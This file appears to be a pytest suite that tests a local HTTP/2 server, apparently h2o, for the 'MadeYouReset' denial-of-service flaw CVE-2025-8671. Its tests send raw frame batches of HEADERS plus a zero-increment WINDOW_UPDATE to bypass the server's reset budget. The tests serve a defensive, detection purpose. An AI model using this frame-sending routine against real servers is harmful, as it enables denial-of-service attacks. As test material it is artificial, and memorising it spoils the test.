#!/usr/bin/env python3
"""
Vulnerability tests for CVE-2025-8671: MadeYouReset HTTP/2 DoS Vulnerability

The vulnerability allows attackers to bypass DoS mitigation. In vulnerable
versions, server-initiated RST_STREAM doesn't decrement reset_budget.

Test approach:
1. Send protocol violations that trigger server-initiated RST_STREAM
2. Each violation should decrement the reset_budget (after fix)
3. After budget exhaustion, legitimate requests should be blocked/delayed

Observable difference:
- VULNERABLE: After many violations, legitimate requests still processed instantly
- FIXED: After many violations, legitimate requests blocked by dos_delay

Test should FAIL in vulnerable environment (requests process instantly)
Test should PASS in fixed environment (requests blocked/delayed)
"""

import ssl
import socket
import struct
import time
import pytest

TARGET_HOST = "localhost"
TARGET_PORT = 8081
TIMEOUT = 15

# HTTP/2 frame types
FRAME_HEADERS = 0x1
FRAME_SETTINGS = 0x4
FRAME_WINDOW_UPDATE = 0x8
FRAME_PING = 0x6

# Flags
FLAG_END_STREAM = 0x1
FLAG_END_HEADERS = 0x4
FLAG_ACK = 0x1

H2_PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"

# Test parameters - match h2o.conf settings
RESET_BUDGET = 10  # http2-max-concurrent-requests-per-connection


def create_ssl_context():
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.set_alpn_protocols(["h2"])
    return ctx


def open_h2_socket():
    ctx = create_ssl_context()
    sock = socket.create_connection((TARGET_HOST, TARGET_PORT), timeout=TIMEOUT)
    tls_sock = ctx.wrap_socket(sock, server_hostname=TARGET_HOST)
    if tls_sock.selected_alpn_protocol() != "h2":
        raise RuntimeError("ALPN did not negotiate h2")
    tls_sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    return tls_sock


def build_frame(frame_type, flags, stream_id, payload):
    """Build an HTTP/2 frame."""
    header = struct.pack(">I", len(payload))[1:]  # 3 bytes length
    header += struct.pack(">B", frame_type)
    header += struct.pack(">B", flags)
    header += struct.pack(">I", stream_id & 0x7FFFFFFF)
    return header + payload


def encode_headers(path="/"):
    """Encode HTTP/2 headers using literal encoding."""
    headers = [
        (":method", "GET"),
        (":scheme", "https"),
        (":authority", TARGET_HOST),
        (":path", path)
    ]
    result = b""
    for name, value in headers:
        result += b"\x00"  # Literal header field without indexing
        result += bytes([len(name)]) + name.encode()
        result += bytes([len(value)]) + value.encode()
    return result


def init_connection(sock):
    """Initialize HTTP/2 connection with server."""
    sock.sendall(H2_PREFACE)
    sock.sendall(build_frame(FRAME_SETTINGS, 0, 0, b""))
    sock.settimeout(2)
    try:
        sock.recv(65535)
    except socket.timeout:
        pass
    sock.sendall(build_frame(FRAME_SETTINGS, FLAG_ACK, 0, b""))


def recv_all(sock, timeout=0.5):
    """Receive all available data with timeout."""
    sock.settimeout(timeout)
    data = b""
    try:
        while True:
            chunk = sock.recv(65535)
            if not chunk:
                break
            data += chunk
    except socket.timeout:
        pass
    except Exception:
        pass
    return data


def send_violation_batch(sock, stream_id, headers_payload):
    """
    Send HEADERS + WINDOW_UPDATE(0) in same TCP packet.

    WINDOW_UPDATE with 0 increment is a protocol error that triggers
    server-initiated RST_STREAM, which should decrement reset_budget (after fix).

    By batching frames, we ensure the stream is still in the server's stream
    table when WINDOW_UPDATE is processed.
    """
    batch = build_frame(
        FRAME_HEADERS,
        FLAG_END_HEADERS | FLAG_END_STREAM,
        stream_id,
        headers_payload
    )
    batch += build_frame(
        FRAME_WINDOW_UPDATE,
        0,
        stream_id,
        struct.pack(">I", 0)  # 0 increment = protocol error
    )
    sock.sendall(batch)


class TestResetBudgetMitigation:
    """
    Test that reset budget is properly decremented for server-initiated resets.

    Key observable behavior:
    - VULNERABLE: Legitimate requests after violations still processed instantly
    - FIXED: Legitimate requests after violations are blocked/delayed by dos_delay
    """

    def test_legitimate_request_blocked_after_violations(self):
        """
        Send violations to exhaust budget, then check if legitimate request is blocked.

        Steps:
        1. Send RESET_BUDGET + 3 violations (batched HEADERS + WINDOW_UPDATE(0))
        2. Send legitimate request
        3. Check if request is processed or blocked

        FAIL (vulnerable): Request processed instantly (< 500ms)
        PASS (fixed): Request blocked (no response within 1s)
        """
        sock = open_h2_socket()
        try:
            init_connection(sock)
            stream_id = 1
            headers = encode_headers()

            # Phase 1: Exhaust budget with violations
            num_violations = RESET_BUDGET + 3
            for i in range(num_violations):
                send_violation_batch(sock, stream_id, headers)
                recv_all(sock, timeout=0.05)
                stream_id += 2

            # Phase 2: Send legitimate request
            start = time.time()
            sock.sendall(build_frame(
                FRAME_HEADERS,
                FLAG_END_HEADERS | FLAG_END_STREAM,
                stream_id,
                headers
            ))

            # Try to receive response with 1 second timeout
            sock.settimeout(1.0)
            response_received = False
            try:
                data = sock.recv(65535)
                if data and len(data) >= 9:
                    frame_type = data[3]
                    if frame_type == FRAME_HEADERS:  # Got actual response
                        response_received = True
            except socket.timeout:
                pass

            elapsed = time.time() - start

        finally:
            try:
                sock.close()
            except:
                pass

        # In vulnerable version: response is instant (< 500ms)
        # In fixed version: request is blocked (no response in 1s)
        if response_received and elapsed < 0.5:
            pytest.fail(
                f"Vulnerability detected: Legitimate request after {num_violations} violations "
                f"completed in {elapsed*1000:.0f}ms. "
                f"In fixed version, dos_delay should block the request."
            )

    def test_connection_level_ping_still_works(self):
        """
        Verify connection is still alive but new requests are blocked.

        After budget exhaustion:
        - Connection-level operations (PING) should still work
        - Stream-level operations (new requests) should be blocked

        This distinguishes from complete connection death.

        FAIL (vulnerable): Both PING and requests work fine
        PASS (fixed): PING works but requests blocked
        """
        sock = open_h2_socket()
        try:
            init_connection(sock)
            stream_id = 1
            headers = encode_headers()

            # Exhaust budget
            for i in range(RESET_BUDGET + 3):
                send_violation_batch(sock, stream_id, headers)
                recv_all(sock, timeout=0.05)
                stream_id += 2

            # Test PING (connection-level)
            sock.sendall(build_frame(FRAME_PING, 0, 0, b"12345678"))
            ping_response = recv_all(sock, timeout=0.5)
            ping_works = b'\x00\x00\x08\x06\x01\x00\x00\x00\x00' in ping_response

            # Test new request
            sock.sendall(build_frame(
                FRAME_HEADERS,
                FLAG_END_HEADERS | FLAG_END_STREAM,
                stream_id,
                headers
            ))
            sock.settimeout(1.0)
            request_works = False
            try:
                data = sock.recv(65535)
                if data and len(data) >= 9 and data[3] == FRAME_HEADERS:
                    request_works = True
            except socket.timeout:
                pass

        finally:
            try:
                sock.close()
            except:
                pass

        # Vulnerable: both work
        # Fixed: PING works, request blocked
        if ping_works and request_works:
            pytest.fail(
                "Vulnerability detected: After budget exhaustion, both PING and "
                "new requests work. In fixed version, requests should be blocked."
            )

    def test_multiple_connections_independent_budget(self):
        """
        Each connection should have independent budget.

        After budget exhaustion on one connection:
        - That connection's requests should be blocked
        - New connections should work normally (fresh budget)

        FAIL (vulnerable): All connections process requests instantly
        PASS (fixed): Exhausted connection blocked, new connection works
        """
        blocked_count = 0

        for conn_idx in range(3):
            try:
                sock = open_h2_socket()
                init_connection(sock)
                stream_id = 1
                headers = encode_headers()

                # Exhaust budget
                for i in range(RESET_BUDGET + 3):
                    send_violation_batch(sock, stream_id, headers)
                    recv_all(sock, timeout=0.05)
                    stream_id += 2

                # Test request
                start = time.time()
                sock.sendall(build_frame(
                    FRAME_HEADERS,
                    FLAG_END_HEADERS | FLAG_END_STREAM,
                    stream_id,
                    headers
                ))

                sock.settimeout(1.0)
                try:
                    data = sock.recv(65535)
                    elapsed = time.time() - start
                    # If response within 500ms, not blocked
                    if not (data and len(data) >= 9 and data[3] == FRAME_HEADERS and elapsed < 0.5):
                        blocked_count += 1
                except socket.timeout:
                    blocked_count += 1

                sock.close()

            except Exception:
                # Connection error could indicate aggressive mitigation
                blocked_count += 1

            time.sleep(0.2)

        # At least some connections should show blocking behavior
        assert blocked_count >= 1, (
            f"Vulnerability detected: {blocked_count}/3 connections showed request blocking. "
            f"In fixed version, each connection should block requests after budget exhaustion."
        )


class TestBudgetExhaustionBehavior:
    """
    Additional tests for budget exhaustion behavior.
    """

    def test_request_blocked_not_connection_killed(self):
        """
        Verify mitigation is delay-based, not connection termination.

        After budget exhaustion:
        - Connection stays alive (can send/receive frames)
        - New stream requests are blocked (queued, not processed)

        FAIL (vulnerable): Requests processed normally
        PASS (fixed): Requests blocked but connection alive
        """
        sock = open_h2_socket()
        try:
            init_connection(sock)
            stream_id = 1
            headers = encode_headers()

            # Exhaust budget
            for i in range(RESET_BUDGET + 3):
                send_violation_batch(sock, stream_id, headers)
                recv_all(sock, timeout=0.05)
                stream_id += 2

            # Send request
            sock.sendall(build_frame(
                FRAME_HEADERS,
                FLAG_END_HEADERS | FLAG_END_STREAM,
                stream_id,
                headers
            ))

            # Check for immediate response vs timeout
            sock.settimeout(1.0)
            immediate_response = False
            try:
                data = sock.recv(65535)
                if data and len(data) >= 9 and data[3] == FRAME_HEADERS:
                    immediate_response = True
            except socket.timeout:
                pass

            # Check if connection is still alive with PING
            sock.sendall(build_frame(FRAME_PING, 0, 0, b"testping"))
            ping_response = recv_all(sock, timeout=0.5)
            connection_alive = len(ping_response) > 0

        finally:
            try:
                sock.close()
            except:
                pass

        if immediate_response:
            pytest.fail(
                "Vulnerability detected: Request after budget exhaustion got "
                "immediate response. In fixed version, request should be blocked."
            )

    def test_violation_without_end_stream_also_counts(self):
        """
        Test violations on streams without END_STREAM.

        WINDOW_UPDATE(0) on an open stream should also trigger budget decrement.

        FAIL (vulnerable): Requests not blocked
        PASS (fixed): Requests blocked
        """
        sock = open_h2_socket()
        try:
            init_connection(sock)
            stream_id = 1
            headers = encode_headers()

            # Send violations: HEADERS without END_STREAM + WINDOW_UPDATE(0)
            for i in range(RESET_BUDGET + 3):
                # HEADERS without END_STREAM
                sock.sendall(build_frame(
                    FRAME_HEADERS,
                    FLAG_END_HEADERS,  # No END_STREAM
                    stream_id,
                    headers
                ))
                # Immediately send invalid WINDOW_UPDATE
                sock.sendall(build_frame(
                    FRAME_WINDOW_UPDATE,
                    0,
                    stream_id,
                    struct.pack(">I", 0)
                ))
                recv_all(sock, timeout=0.05)
                stream_id += 2

            # Test new request
            sock.sendall(build_frame(
                FRAME_HEADERS,
                FLAG_END_HEADERS | FLAG_END_STREAM,
                stream_id,
                headers
            ))

            sock.settimeout(1.0)
            request_blocked = True
            try:
                data = sock.recv(65535)
                if data and len(data) >= 9 and data[3] == FRAME_HEADERS:
                    request_blocked = False
            except socket.timeout:
                pass

        finally:
            try:
                sock.close()
            except:
                pass

        assert request_blocked, (
            "Vulnerability detected: Request after violations (without END_STREAM) "
            "got immediate response. Budget should be decremented for all violations."
        )
